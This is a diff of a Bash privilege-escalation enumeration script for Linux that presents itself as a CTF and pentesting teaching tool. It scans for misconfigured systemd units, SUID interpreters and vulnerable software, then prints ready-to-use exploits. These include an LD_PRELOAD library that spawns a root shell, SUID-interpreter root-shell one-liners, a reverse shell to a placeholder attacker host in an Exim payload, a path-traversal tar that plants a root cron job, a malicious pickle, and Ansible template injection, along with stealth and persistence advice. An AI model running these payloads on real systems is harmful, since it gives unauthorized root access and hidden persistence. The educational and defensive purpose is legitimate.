+            [ $count -le 10 ] && info "  • $service_name"
+        done < "$temp_restart_services"
+        
+        local total=$(wc -l < "$temp_restart_services")
+        if [ $total -gt 10 ]; then
+            info "  ... and $((total - 10)) more"
+        fi
+        
+        log ""
+        teach "AUTO-RESTART EXPLOITATION:"
+        teach "  Restart=always → Service auto-restarts on crash"
+        teach ""
+        teach "  EXPLOITATION IDEA:"
+        teach "    1. Modify service/script to run payload then crash"
+        teach "    2. Service crashes"
+        teach "    3. Systemd auto-restarts it"
+        teach "    4. Payload runs again"
+        teach "    5. Persistent exploitation"
+        teach ""
+        teach "  EXAMPLE:"
+        teach "    # Modify service ExecStart to:"
+        teach "    ExecStart=/bin/bash -c 'chmod u+s /bin/bash; exit 1'"
+        teach "    # Exits with error → systemd restarts → payload runs repeatedly"
+        log ""
+    fi
+    
+    # Report writable environment files (BATCHED)
+    if [ -s "$temp_env_files" ]; then
+        critical "WRITABLE ENVIRONMENT FILES - Variable injection attack"
+        log ""
+        
+        while IFS='|' read -r service_file service_name env_file; do
+            critical "  → $env_file"
+            info "     Service: $service_name"
+        done < "$temp_env_files"
+        
+        log ""
+        teach "╔═══════════════════════════════════════════════════════════════╗"
+        teach "║  ENVIRONMENT FILE EXPLOITATION                                ║"
+        teach "╚═══════════════════════════════════════════════════════════════╝"
+        teach ""
+        teach "WHAT ARE ENVIRONMENT FILES:"
+        teach "  Services load variables from files before execution"
+        teach "  Example: EnvironmentFile=/etc/default/myapp"
+        teach "  Service then uses: ExecStart=/usr/bin/myapp \$OPTIONS"
+        teach ""
+        teach "EXPLOITATION VECTORS:"
+        teach ""
+        teach "  Vector 1: Command injection via variable"
+        teach "    ENV_FILE=/path/to/writable/envfile  # From above"
+        teach "    echo 'OPTIONS=; chmod u+s /bin/bash #' >> \$ENV_FILE"
+        teach "    systemctl restart SERVICE_NAME"
+        teach "    # If service uses \$OPTIONS in command, injection succeeds"
+        teach ""
+        teach "  Vector 2: LD_PRELOAD hijacking"
+        teach "    # Create malicious library"
+        teach "    cat > /tmp/evil.c << 'EOF'"
+        teach "    #include <stdlib.h>"
+        teach "    #include <unistd.h>"
+        teach "    void _init() {"
+        teach "        setuid(0); setgid(0);"
+        teach "        system(\"/bin/bash -p\");"
+        teach "    }"
+        teach "    EOF"
+        teach "    gcc -shared -fPIC -o /tmp/evil.so /tmp/evil.c"
+        teach "    "
+        teach "    # Inject into environment"
+        teach "    echo 'LD_PRELOAD=/tmp/evil.so' >> \$ENV_FILE"
+        teach "    systemctl restart SERVICE_NAME"
+        teach ""
+        teach "  Vector 3: PATH hijacking"
+        teach "    echo 'PATH=/tmp:\$PATH' >> \$ENV_FILE"
+        teach "    # Create malicious binary in /tmp"
+        teach "    # Named same as binary service calls"
+        teach "    systemctl restart SERVICE_NAME"
+        teach ""
+        teach "WHY THIS WORKS:"
+        teach "  • Environment loaded BEFORE ExecStart runs"
+        teach "  • Variables expand during execution"
+        teach "  • LD_PRELOAD loaded before any library"
+        teach "  • PATH searched left-to-right"
+        log ""
+    fi
+    
+    # === PHASE 4: CLEAN SUMMARY ===
+    if [ $found_issues -eq 0 ]; then
+        ok "No exploitable systemd misconfigurations found"
+        log ""
+        teach "WHAT WAS CHECKED:"
+        teach "  ✓ Writable service directories"
+        teach "  ✓ Writable .service files"
+        teach "  ✓ Writable ExecStart scripts"
+        teach "  ✓ Writable .timer files"
+        teach "  ✓ Suspicious relative paths in ExecStart"
+        teach "  ✓ Writable EnvironmentFiles"
+        teach "  ✓ Services with auto-restart capability"
+        log ""
+        teach "YOUR SYSTEMD CONFIGURATION APPEARS SECURE"
+        log ""
+        teach "Note: Standard system binaries (systemctl, journalctl, udevadm, etc.)"
+        teach "      use relative paths by design but are NOT exploitable via PATH"
+        teach "      hijacking. These have been filtered from results."
+    else
+        log ""
+        teach "═════════════════════════════════════════════════════════════════"
+        teach "SYSTEMD EXPLOITATION SUMMARY"
+        teach "═════════════════════════════════════════════════════════════════"
+        teach ""
+        teach "EXPLOITATION PRIORITY (High → Low):"
+        teach "  1. Writable service directories → Create new services"
+        teach "  2. Writable .service files → Modify ExecStart= directly"
+        teach "  3. Writable ExecStart scripts → Replace with payload"
+        teach "  4. Writable EnvironmentFiles → Inject LD_PRELOAD/PATH"
+        teach "  5. Writable .timer files → Modify schedule + service"
+        teach "  6. Writable binaries → Direct replacement"
+        teach ""
+        teach "ESSENTIAL COMMANDS:"
+        teach "  systemctl daemon-reload      # Reload after file changes"
+        teach "  systemctl start SERVICE      # Trigger immediately"
+        teach "  systemctl restart SERVICE    # Stop then start"
+        teach "  systemctl status SERVICE     # Check current state"
+        teach "  systemctl is-enabled SERVICE # Check boot persistence"
+        teach "  systemctl list-timers        # View all scheduled timers"
+        teach "  journalctl -u SERVICE -n 50  # Recent logs"
+        teach ""
+        teach "STEALTH CONSIDERATIONS:"
+        teach "  • Backup original files before modification"
+        teach "  • Use ExecStartPre to preserve functionality"
+        teach "  • Monitor logs for failures (journalctl)"
+        teach "  • Restore originals after exploitation"
+        teach "  • Test in dev environment first"
+        teach ""
+        teach "PERSISTENCE TIPS:"
+        teach "  • Add WantedBy=multi-user.target to [Install]"
+        teach "  • Run: systemctl enable SERVICE"
+        teach "  • Service now starts on boot"
+        teach "  • Survives reboots and shell loss"
+        teach ""
+        teach "WHY SYSTEMD MATTERS FOR CTF/PENTESTING:"
+        teach "  • Present on 95%+ modern Linux (Ubuntu 15.04+, Debian 8+, etc.)"
+        teach "  • Often misconfigured during quick deployments"
+        teach "  • Multiple exploitation vectors"
+        teach "  • Provides reliable persistence"
+        teach "  • Less familiar to defenders than cron"
+        log ""
+    fi
 }
-
 # === ENVIRONMENT VARIABLES ===
 enum_env() {
     section "ENVIRONMENT VARIABLE ANALYSIS"
@@ -5958,77 +7305,548 @@ enum_passwords() {
         fi
     done < /etc/passwd
 }
-# ============================================
-# Software Version Checking
-# ============================================
-
+# === SOFTWARE VERSION CHECKING - PRIVESC FOCUS ===
 enum_software_versions() {
-    section "INSTALLED SOFTWARE VERSION ANALYSIS"
+    section "EXPLOITABLE SOFTWARE VERSIONS"
     
-    explain_concept "Vulnerable Software Detection" \
-        "Outdated software often contains known exploitable vulnerabilities. Identifying installed versions helps locate attack vectors." \
-        "Package managers track installed software. CVE databases document version-specific vulnerabilities. Attackers search for services running old versions with public exploits. Common targets: Apache, nginx, PHP, Python libraries, database servers." \
-        "Process:\n  1. List installed packages\n  2. Identify versions\n  3. Cross-reference with exploit-db or searchsploit\n  4. Focus on network-facing services first"
+    # === PHASE 1: SILENT SCAN - Only software with KNOWN privesc exploits ===
+    local temp_vuln_software="/tmp/.learnpeas_vuln_software_$$"
+    local temp_setuid_software="/tmp/.learnpeas_setuid_software_$$"
+    local temp_cron_interpreters="/tmp/.learnpeas_cron_interp_$$"
     
-    info "Enumerating installed packages ( a moment)..."
+    cleanup_version_temps() {
+        rm -f "$temp_vuln_software" "$temp_setuid_software" "$temp_cron_interpreters" 2>/dev/null
+    }
+    trap cleanup_version_temps RETURN
     
-    # Detect package manager
-    if command -v dpkg >/dev/null 2>&1; then
-        info "Using dpkg (Debian/Ubuntu system)"
-        
-        # Check for commonly exploitable packages
-        local targets=("apache2" "nginx" "php" "mysql-server" "postgresql" "openssh-server" "sudo" "polkit" "vim" "python3" "ruby" "nodejs")
-        
-        for pkg in "${targets[@]}"; do
-            local version=$(dpkg -l "$pkg" 2>/dev/null | grep "^ii" | awk '{print $3}')
-            if [ -n "$version" ]; then
-                info "  $pkg: $version"
-                teach "  Search exploits: searchsploit $pkg $version"
+    # === CHECK 1: Scripting Languages Used by Root (SUID or Cron) ===
+    # Only check if they're actually exploitable (SUID or run by root)
+    
+    local root_uses_scripts=0
+    
+    # Check for Python scripts in root's crontab or systemd
+    if [ -r /etc/crontab ]; then
+        if grep -E "python|\.py" /etc/crontab 2>/dev/null | grep -qv "^#"; then
+            root_uses_scripts=1
+            
+            # Check Python version for known privesc CVEs
+            if command -v python3 >/dev/null 2>&1; then
+                local py_version=$(python3 --version 2>&1 | grep -oE '[0-9]+\.[0-9]+\.[0-9]+')
+                if [ -n "$py_version" ]; then
+                    local py_major=$(echo "$py_version" | cut -d. -f1)
+                    local py_minor=$(echo "$py_version" | cut -d. -f2)
+                    
+                    # Python < 3.8 has multiple privesc-related CVEs (tarfile, pickle)
+                    if [ "$py_major" -eq 3 ] && [ "$py_minor" -lt 8 ]; then
+                        echo "python3|$py_version|tarfile|CVE-2007-4559 - Path traversal in tarfile extraction" >> "$temp_cron_interpreters"
+                    fi
+                    
+                    # Python < 3.7 has pickle RCE (if root script unpickles user data)
+                    if [ "$py_major" -eq 3 ] && [ "$py_minor" -lt 7 ]; then
+                        echo "python3|$py_version|pickle|Unsafe pickle deserialization" >> "$temp_cron_interpreters"
+                    fi
+                fi
             fi
-        done
-        
-    elif command -v rpm >/dev/null 2>&1; then
-        info "Using rpm (RHEL/CentOS system)"
-        
-        local targets=("httpd" "nginx" "php" "mysql-server" "postgresql-server" "openssh-server" "sudo" "polkit" "vim" "python3")
-        
-        for pkg in "${targets[@]}"; do
-            local version=$(rpm -q "$pkg" 2>/dev/null | grep -v "not installed")
-            if [ -n "$version" ]; then
-                info "  $version"
-                teach "  Search exploits: searchsploit $pkg"
+            
+            # Check for Perl (less common but shellshock-like issues)
+            if command -v perl >/dev/null 2>&1; then
+                if grep -qE "perl|\.pl" /etc/crontab 2>/dev/null; then
+                    local perl_version=$(perl --version 2>/dev/null | grep -oE 'v[0-9]+\.[0-9]+\.[0-9]+' | head -1)
+                    if [ -n "$perl_version" ]; then
+                        echo "perl|$perl_version|taint|Taint mode bypass opportunities" >> "$temp_cron_interpreters"
+                    fi
+                fi
             fi
-        done
+        fi
     fi
     
-    # Check web server versions directly
-    if command -v apache2 >/dev/null 2>&1; then
-        local apache_ver=$(apache2 -v 2>/dev/null | head -1)
-        warn "Apache detected: $apache_ver"
-        teach "Check for known Apache vulnerabilities for this version"
+    # === CHECK 2: SUID Interpreters (Python/Perl/Ruby with SUID bit) ===
+    # These are INSTANT root if found
+    for interpreter in python python2 python3 perl ruby php node nodejs; do
+        local interp_path=$(command -v "$interpreter" 2>/dev/null)
+        if [ -n "$interp_path" ] && [ -u "$interp_path" ]; then
+            local version=$("$interpreter" --version 2>/dev/null | head -1 || echo "unknown")
+            echo "$interpreter|$interp_path|$version" >> "$temp_setuid_software"
+        fi
+    done
+    
+    # === CHECK 3: Known Vulnerable SUID Binaries (version-specific) ===
+    # Only check binaries that have KNOWN CVEs and are commonly misconfigured
+    
+    # screen (CVE-2017-5618 if SUID and < 4.5.1)
+    if [ -u /usr/bin/screen ] || [ -u /bin/screen ]; then
+        local screen_path=$(command -v screen 2>/dev/null)
+        if [ -n "$screen_path" ]; then
+            local screen_version=$(screen -v 2>&1 | grep -oE '[0-9]+\.[0-9]+\.[0-9]+' | head -1)
+            if [ -n "$screen_version" ]; then
+                local major=$(echo "$screen_version" | cut -d. -f1)
+                local minor=$(echo "$screen_version" | cut -d. -f2)
+                local patch=$(echo "$screen_version" | cut -d. -f3)
+                
+                # screen < 4.5.1 with SUID = CVE-2017-5618
+                if [ "$major" -eq 4 ] && [ "$minor" -le 5 ] && [ "$patch" -eq 0 ]; then
+                    echo "screen|$screen_version|CVE-2017-5618|SUID screen privilege escalation" >> "$temp_vuln_software"
+                fi
+            fi
+        fi
     fi
     
-    if command -v nginx >/dev/null 2>&1; then
-        local nginx_ver=$(nginx -v 2>&1)
-        warn "Nginx detected: $nginx_ver"
-        teach "Check for known Nginx vulnerabilities for this version"
+    # tmux (CVE-2022-47016 if SUID - rare but devastating)
+    if [ -u /usr/bin/tmux ] || [ -u /bin/tmux ]; then
+        local tmux_path=$(command -v tmux 2>/dev/null)
+        if [ -n "$tmux_path" ]; then
+            local tmux_version=$(tmux -V 2>&1 | grep -oE '[0-9]+\.[0-9]+' | head -1)
+            echo "tmux|$tmux_version|CVE-2022-47016|SUID tmux allows arbitrary command execution" >> "$temp_vuln_software"
+        fi
     fi
     
-    # Check interpreters
-    if command -v php >/dev/null 2>&1; then
-        local php_ver=$(php -v 2>/dev/null | head -1)
-        warn "PHP detected: $php_ver"
-        teach "Check for PHP CVEs: https://www.cvedetails.com/vulnerability-list/vendor_id-74/product_id-128/PHP-PHP.html"
+    # exim (if installed and running as root - common mail server privesc)
+    if command -v exim >/dev/null 2>&1 || command -v exim4 >/dev/null 2>&1; then
+        local exim_cmd=$(command -v exim4 2>/dev/null || command -v exim 2>/dev/null)
+        local exim_version=$("$exim_cmd" -bV 2>/dev/null | head -1 | grep -oE '[0-9]+\.[0-9]+\.[0-9]+')
+        
+        if [ -n "$exim_version" ]; then
+            local major=$(echo "$exim_version" | cut -d. -f1)
+            local minor=$(echo "$exim_version" | cut -d. -f2)
+            
+            # Exim < 4.92 has multiple local privesc CVEs
+            if [ "$major" -eq 4 ] && [ "$minor" -lt 92 ]; then
+                echo "exim|$exim_version|CVE-2019-10149|Local privilege escalation via crafted recipient" >> "$temp_vuln_software"
+            fi
+        fi
     fi
     
-    # Check Python packages
-    if command -v pip3 >/dev/null 2>&1; then
-        info "Checking Python packages for known vulnerabilities..."
-        teach "Run 'pip3 list --outdated' to see outdated packages"
-        teach "Use 'safety check' to scan for known vulnerabilities"
+    # === CHECK 4: Automation Tools That Run as Root ===
+    # Only if they're actually configured (have config files)
+    
+    # Ansible (if /etc/ansible exists)
+    if [ -d /etc/ansible ] && command -v ansible >/dev/null 2>&1; then
+        local ansible_version=$(ansible --version 2>/dev/null | head -1 | grep -oE '[0-9]+\.[0-9]+\.[0-9]+')
+        if [ -n "$ansible_version" ]; then
+            local major=$(echo "$ansible_version" | cut -d. -f1)
+            local minor=$(echo "$ansible_version" | cut -d. -f2)
+            
+            # Ansible < 2.9 has template injection and privilege escalation CVEs
+            if [ "$major" -eq 2 ] && [ "$minor" -lt 9 ]; then
+                echo "ansible|$ansible_version|CVE-2019-10206|Template injection leading to RCE" >> "$temp_vuln_software"
+            fi
+        fi
+    fi
+    
+    # Chef (if /etc/chef exists)
+    if [ -d /etc/chef ] && command -v chef-client >/dev/null 2>&1; then
+        local chef_version=$(chef-client --version 2>/dev/null | grep -oE '[0-9]+\.[0-9]+\.[0-9]+')
+        if [ -n "$chef_version" ]; then
+            echo "chef|$chef_version|symlink|Symlink attack during package installation" >> "$temp_vuln_software"
+        fi
+    fi
+    
+    # === PHASE 2: CONDITIONAL EDUCATION ===
+    local has_findings=0
+    [ -s "$temp_vuln_software" ] && has_findings=1
+    [ -s "$temp_setuid_software" ] && has_findings=1
+    [ -s "$temp_cron_interpreters" ] && has_findings=1
+    
+    if [ $has_findings -eq 1 ]; then
+        log ""
+        teach "╔═══════════════════════════════════════════════════════════╗"
+        teach "║  SOFTWARE VULNERABILITIES - Why Version Matters          ║"
+        teach "╚═══════════════════════════════════════════════════════════╝"
+        teach ""
+        teach "SCOPE OF THIS CHECK:"
+        teach "  This module focuses ONLY on software that:"
+        teach "  • Runs as root (cron scripts, systemd services)"
+        teach "  • Is SUID (can directly escalate privileges)"
+        teach "  • Has KNOWN exploitable CVEs for privilege escalation"
+        teach ""
+        teach "WHY THESE VULNERABILITIES EXIST:"
+        teach "  ✗ Developers prioritize features over security"
+        teach "  ✗ Complex codebases (Python, Perl) have subtle bugs"
+        teach "  ✗ Admins install and forget (no updates)"
+        teach "  ✗ SUID bit on interpreters = massive attack surface"
+        teach ""
+        teach "EXPLOITATION MODEL:"
+        teach "  1. Identify vulnerable software running as root"
+        teach "  2. Find how YOU can interact with it (input, files, etc.)"
+        teach "  3. Trigger the vulnerability with crafted input"
+        teach "  4. Vulnerability executes YOUR code as root"
+        log ""
+    fi
+    
+    # === PHASE 3: REPORT FINDINGS ===
+    
+    # Report SUID Interpreters (CRITICAL - Instant root)
+    if [ -s "$temp_setuid_software" ]; then
+        critical "SUID INTERPRETERS DETECTED - INSTANT ROOT ACCESS"
+        log ""
+        
+        while IFS='|' read -r interpreter path version; do
+            critical "SUID $interpreter: $path (version: $version)"
+            vuln "This interpreter can execute arbitrary code as root!"
+            log ""
+            
+            teach "╔═══════════════════════════════════════════════════════════╗"
+            teach "║  SUID INTERPRETER - Critical Misconfiguration            ║"
+            teach "╚═══════════════════════════════════════════════════════════╝"
+            teach ""
+            teach "WHAT THIS MEANS:"
+            teach "  An interpreter with the SUID bit runs as the file owner (root)."
+            teach "  You can write ANY code and it executes as root."
+            teach "  This is like giving you sudo with no password."
+            teach ""
+            teach "WHY THIS IS CATASTROPHIC:"
+            teach "  Normal: User writes script → script runs as user"
+            teach "  SUID interpreter: User writes script → script runs as ROOT"
+            teach ""
+            teach "  Example of the mistake:"
+            teach "  Admin thinks: 'I'll make python SUID so my script works'"
+            teach "  Reality: EVERY python script now runs as root"
+            teach ""
+            
+            case "$interpreter" in
+                python*|python)
+                    teach "═══════════════════════════════════════════════════════════"
+                    teach "INSTANT ROOT - Python SUID Exploitation:"
+                    teach "═══════════════════════════════════════════════════════════"
+                    teach ""
+                    teach "$path -c 'import os; os.setuid(0); os.execl(\"/bin/bash\", \"bash\", \"-p\")'"
+                    teach ""
+                    teach "What this does:"
+                    teach "  1. Python runs with EUID=0 (root) due to SUID bit"
+                    teach "  2. os.setuid(0) makes RUID=0 (real user ID becomes root)"
+                    teach "  3. os.execl() replaces process with bash"
+                    teach "  4. bash -p preserves privileges"
+                    teach "  5. You now have a root shell"
+                    teach ""
+                    teach "Alternative - Create SUID bash for persistence:"
+                    teach "  $path -c 'import os; os.chmod(\"/bin/bash\", 0o4755)'"
+                    teach "  /bin/bash -p"
+                    ;;
+                    
+                perl)
+                    teach "═══════════════════════════════════════════════════════════"
+                    teach "INSTANT ROOT - Perl SUID Exploitation:"
+                    teach "═══════════════════════════════════════════════════════════"
+                    teach ""
+                    teach "$path -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/bash\", \"-p\";'"
+                    teach ""
+                    teach "What this does:"
+                    teach "  1. Perl runs with SUID privileges"
+                    teach "  2. POSIX::setuid(0) sets real UID to 0"
+                    teach "  3. exec() spawns bash as root"
+                    ;;
+                    
+                ruby)
+                    teach "═══════════════════════════════════════════════════════════"
+                    teach "INSTANT ROOT - Ruby SUID Exploitation:"
+                    teach "═══════════════════════════════════════════════════════════"
+                    teach ""
+                    teach "$path -e 'Process::Sys.setuid(0); exec \"/bin/bash\", \"-p\"'"
+                    ;;
+                    
+                php)
+                    teach "═══════════════════════════════════════════════════════════"
+                    teach "INSTANT ROOT - PHP SUID Exploitation:"
+                    teach "═══════════════════════════════════════════════════════════"
+                    teach ""
+                    teach "$path -r 'posix_setuid(0); system(\"/bin/bash -p\");'"
+                    ;;
+                    
+                node|nodejs)
+                    teach "═══════════════════════════════════════════════════════════"
+                    teach "INSTANT ROOT - Node.js SUID Exploitation:"
+                    teach "═══════════════════════════════════════════════════════════"
+                    teach ""
+                    teach "$path -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/bash\", [\"-p\"], {stdio: [0,1,2]})'"
+                    ;;
+            esac
+            
+            teach ""
+            teach "WHY ADMINS DO THIS:"
+            teach "  • Script needs root for ONE operation"
+            teach "  • Admin makes interpreter SUID instead of just the script"
+            teach "  • Doesn't realize this affects ALL scripts in that language"
+            teach ""
+            teach "THE SECURITY LESSON:"
+            teach "  NEVER make interpreters SUID. Instead:"
+            teach "  ✓ Use sudo with specific script path"
+            teach "  ✓ Make a compiled wrapper that's SUID"
+            teach "  ✓ Use capabilities (cap_setuid) on specific binary"
+            log ""
+        done < "$temp_setuid_software"
+    fi
+    
+    # Report vulnerable SUID binaries with version-specific exploits
+    if [ -s "$temp_vuln_software" ]; then
+        critical "VULNERABLE SUID/ROOT SOFTWARE DETECTED"
+        log ""
+        
+        while IFS='|' read -r software version cve description; do
+            critical "$software $version - $cve"
+            vuln "$description"
+            log ""
+            
+            case "$software" in
+                screen)
+                    teach "╔═══════════════════════════════════════════════════════════╗"
+                    teach "║  CVE-2017-5618 - GNU Screen SUID Privilege Escalation    ║"
+                    teach "╚═══════════════════════════════════════════════════════════╝"
+                    teach ""
+                    teach "WHAT IT IS:"
+                    teach "  GNU screen with SUID bit + version < 4.5.1 has a buffer"
+                    teach "  overflow in the logfile handling. Allows local privilege"
+                    teach "  escalation to root."
+                    teach ""
+                    teach "WHY IT EXISTS:"
+                    teach "  screen allows shared terminal sessions. When creating a log"
+                    teach "  file, it doesn't properly validate the filename length."
+                    teach "  Attacker can overflow the buffer with a long filename,"
+                    teach "  overwriting memory to execute arbitrary code as root."
+                    teach ""
+                    teach "EXPLOITATION:"
+                    teach "  1. Download exploit:"
+                    teach "     wget https://www.exploit-db.com/download/41154"
+                    teach "  2. Compile:"
+                    teach "     gcc 41154.c -o screen_exploit"
+                    teach "  3. Run:"
+                    teach "     ./screen_exploit"
+                    teach "  4. Get root shell"
+                    teach ""
+                    teach "HOW IT WORKS:"
+                    teach "  Exploit creates a malicious logfile path that triggers"
+                    teach "  the overflow when screen processes it with SUID privileges."
+                    teach ""
+                    teach "IMPACT: Any user → Root (if screen is SUID)"
+                    ;;
+                    
+                exim)
+                    teach "╔═══════════════════════════════════════════════════════════╗"
+                    teach "║  CVE-2019-10149 - Exim Mail Server Privilege Escalation  ║"
+                    teach "╚═══════════════════════════════════════════════════════════╝"
+                    teach ""
+                    teach "WHAT IT IS:"
+                    teach "  Exim mail server < 4.92 allows remote command execution"
+                    teach "  via crafted recipient addresses. Since exim runs as root,"
+                    teach "  this leads to immediate privilege escalation."
+                    teach ""
+                    teach "WHY IT EXISTS:"
+                    teach "  Exim doesn't properly validate recipient email addresses"
+                    teach "  in certain configurations. Attacker can inject shell"
+                    teach "  commands that get executed when exim processes the mail."
+                    teach ""
+                    teach "EXPLOITATION:"
+                    teach "  1. Check if exim is vulnerable:"
+                    teach "     exim --version"
+                    teach "  2. Download exploit (if local access):"
+                    teach "     searchsploit exim 4.8"
+                    teach "  3. Craft malicious recipient:"
+                    teach "     \${run{/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'}}"
+                    teach "  4. Trigger via local mail or SMTP"
+                    teach ""
+                    teach "LOCAL EXPLOITATION:"
+                    teach "  If you can send local mail as unprivileged user:"
+                    teach "  echo 'test' | exim -be '\${run{id}}'"
+                    teach ""
+                    teach "IMPACT: Remote/Local code execution as root"
+                    ;;
+                    
+                ansible)
+                    teach "╔═══════════════════════════════════════════════════════════╗"
+                    teach "║  Ansible Privilege Escalation - Template Injection       ║"
+                    teach "╚═══════════════════════════════════════════════════════════╝"
+                    teach ""
+                    teach "WHAT IT IS:"
+                    teach "  Ansible < 2.9 has template injection vulnerabilities."
+                    teach "  If you can control playbook content or variables, you"
+                    teach "  can inject Jinja2 template code that executes as root."
+                    teach ""
+                    teach "WHY IT EXISTS:"
+                    teach "  Ansible uses Jinja2 templating. If user-controlled data"
+                    teach "  reaches template rendering without sanitization, attacker"
+                    teach "  can inject {{ }} expressions that execute Python code."
+                    teach ""
+                    teach "EXPLOITATION:"
+                    teach "  If you can modify playbooks or inventory files:"
+                    teach ""
+                    teach "  1. Inject template code in playbook:"
+                    teach "     - name: Pwn"
+                    teach "       command: \"{{ lookup('pipe', 'chmod u+s /bin/bash') }}\""
+                    teach ""
+                    teach "  2. Or in inventory variables:"
+                    teach "     ansible_host={{ lookup('pipe', 'id > /tmp/pwned') }}"
+                    teach ""
+                    teach "  3. Wait for ansible-playbook to run"
+                    teach "  4. Code executes as root"
+                    teach ""
+                    teach "CHECK FOR WRITABLE PLAYBOOKS:"
+                    teach "  find /etc/ansible -type f -writable 2>/dev/null"
+                    ;;
+            esac
+            log ""
+        done < "$temp_vuln_software"
+    fi
+    
+    # Report interpreters used by root cron with known issues
+    if [ -s "$temp_cron_interpreters" ]; then
+        warn "INTERPRETERS USED BY ROOT SCRIPTS - Potential Issues"
+        log ""
+        
+        while IFS='|' read -r interpreter version vuln_type description; do
+            warn "$interpreter $version used by root cron/systemd"
+            info "Potential issue: $description"
+            log ""
+            
+            case "$vuln_type" in
+                tarfile)
+                    teach "╔═══════════════════════════════════════════════════════════╗"
+                    teach "║  Python tarfile Path Traversal (CVE-2007-4559)           ║"
+                    teach "╚═══════════════════════════════════════════════════════════╝"
+                    teach ""
+                    teach "WHAT IT IS:"
+                    teach "  Python's tarfile module doesn't sanitize paths during"
+                    teach "  extraction. If a root script extracts a tar archive you"
+                    teach "  control, you can write files outside the extraction dir."
+                    teach ""
+                    teach "EXPLOITATION SCENARIO:"
+                    teach "  1. Root script does: tarfile.open('backup.tar').extractall()"
+                    teach "  2. You create malicious tar with path: ../../../etc/cron.d/pwn"
+                    teach "  3. Script extracts your tar as root"
+                    teach "  4. Your cron job gets written to /etc/cron.d/"
+                    teach "  5. Cron executes your job as root"
+                    teach ""
+                    teach "CREATE MALICIOUS TAR:"
+                    teach "  echo '* * * * * root chmod u+s /bin/bash' > pwn"
+                    teach "  tar -cf evil.tar --transform='s|pwn|../../../etc/cron.d/pwn|' pwn"
+                    teach ""
+                    teach "PLACE TAR WHERE ROOT SCRIPT WILL PROCESS IT:"
+                    teach "  • /tmp/*.tar (if script processes /tmp)"
+                    teach "  • /var/backups/*.tar"
+                    teach "  • Anywhere the script looks for tar files"
+                    ;;
+                    
+                pickle)
+                    teach "╔═══════════════════════════════════════════════════════════╗"
+                    teach "║  Python pickle Deserialization RCE                       ║"
+                    teach "╚═══════════════════════════════════════════════════════════╝"
+                    teach ""
+                    teach "WHAT IT IS:"
+                    teach "  Python's pickle module serializes objects. If a root"
+                    teach "  script unpickles data you control, you can execute"
+                    teach "  arbitrary Python code as root."
+                    teach ""
+                    teach "WHY IT'S DANGEROUS:"
+                    teach "  pickle.load() will execute ANY code embedded in the"
+                    teach "  serialized data. There's no way to safely unpickle"
+                    teach "  untrusted data."
+                    teach ""
+                    teach "EXPLOITATION:"
+                    teach "  1. Find root script that does: pickle.load(file)"
+                    teach "  2. Create malicious pickle file:"
+                    teach ""
+                    teach "  import pickle, os"
+                    teach "  class Exploit:"
+                    teach "      def __reduce__(self):"
+                    teach "          return (os.system, ('chmod u+s /bin/bash',))"
+                    teach "  with open('evil.pkl', 'wb') as f:"
+                    teach "      pickle.dump(Exploit(), f)"
+                    teach ""
+                    teach "  3. Place evil.pkl where root script will unpickle it"
+                    teach "  4. When unpickled, os.system runs as root"
+                    ;;
+                    
+                taint)
+                    teach "╔═══════════════════════════════════════════════════════════╗"
+                    teach "║  Perl Taint Mode - Security Feature Bypass              ║"
+                    teach "╚═══════════════════════════════════════════════════════════╝"
+                    teach ""
+                    teach "WHAT IT IS:"
+                    teach "  Perl has 'taint mode' (-T flag) that marks untrusted data."
+                    teach "  However, there are ways to 'launder' tainted data and"
+                    teach "  bypass these protections."
+                    teach ""
+                    teach "EXPLOITATION:"
+                    teach "  If root Perl script uses taint mode but processes your input:"
+                    teach "  • Look for regex matches that 'clean' data"
+                    teach "  • These captures become untainted and can be used in system()"
+                    teach "  • Inject shell metacharacters in cleaned portions"
+                    teach ""
+                    teach "EXAMPLE:"
+                    teach "  if (\$input =~ /^([\\w.-]+)\$/) {  # Looks safe"
+                    teach "      system(\"/bin/process \$1\");    # Actually exploitable"
+                    teach "  }"
+                    teach ""
+                    teach "  Input: 'file.txt; chmod u+s /bin/bash;'"
+                    teach "  The \\w.- regex might allow semicolons in some contexts"
+                    ;;
+            esac
+            log ""
+        done < "$temp_cron_interpreters"
+        
+        teach "═══════════════════════════════════════════════════════════"
+        teach "FINDING ROOT SCRIPTS THAT USE THESE INTERPRETERS:"
+        teach "═══════════════════════════════════════════════════════════"
+        teach ""
+        teach "1. Check cron jobs:"
+        teach "   grep -r 'python\\|perl' /etc/cron*"
+        teach ""
+        teach "2. Check systemd services:"
+        teach "   grep -r 'ExecStart.*python' /etc/systemd/system/ /lib/systemd/system/"
+        teach ""
+        teach "3. Find scripts run by root:"
+        teach "   find /usr/local/bin /opt -name '*.py' -o -name '*.pl' | while read script; do"
+        teach "       [ -r \"\$script\" ] && head -1 \"\$script\" | grep -q '^#!' && echo \"\$script\""
+        teach "   done"
+        teach ""
+        teach "4. Check what those scripts do:"
+        teach "   • Do they process files from /tmp?"
+        teach "   • Do they extract archives?"
+        teach "   • Do they deserialize data?"
+        teach "   • Can you control their input?"
+        log ""
+    fi
+    
+    # === PHASE 4: CLEAN SUMMARY ===
+    if [ $has_findings -eq 0 ]; then
+        ok "No exploitable software versions detected"
+        log ""
+        teach "WHAT WAS CHECKED:"
+        teach "  ✓ SUID interpreters (Python, Perl, Ruby, PHP, Node)"
+        teach "  ✓ SUID binaries with known CVEs (screen, tmux)"
+        teach "  ✓ Root services with exploit history (exim, ansible)"
+        teach "  ✓ Interpreters used by root with dangerous features"
+        teach ""
+        teach "WHAT WAS NOT CHECKED:"
+        teach "  ✗ General software inventory (not privesc-relevant)"
+        teach "  ✗ Desktop applications"
+        teach "  ✗ Libraries without direct exploit path"
+    else
+        log ""
+        info "Software vulnerability scan complete"
+        log ""
+        teach "═══════════════════════════════════════════════════════════"
+        teach "EXPLOITATION PRIORITY:"
+        teach "═══════════════════════════════════════════════════════════"
+        teach ""
+        teach "1. SUID INTERPRETERS (CRITICAL)"
+        teach "   → Instant root, no exploit needed, just run code"
+        teach ""
+        teach "2. SUID BINARIES WITH CVEs"
+        teach "   → Download exploit, compile, run → root"
+        teach ""
+        teach "3. ROOT SERVICES WITH KNOWN BUGS"
+        teach "   → Requires finding input vector, then exploit"
+        teach ""
+        teach "4. INTERPRETERS USED BY ROOT"
+        teach "   → Need to control script input, then inject payload"
+        teach ""
+        teach "REMEMBER:"
+        teach "  Version alone doesn't guarantee exploitability."
+        teach "  You need:"
+        teach "  • Software running with elevated privileges (SUID/root)"
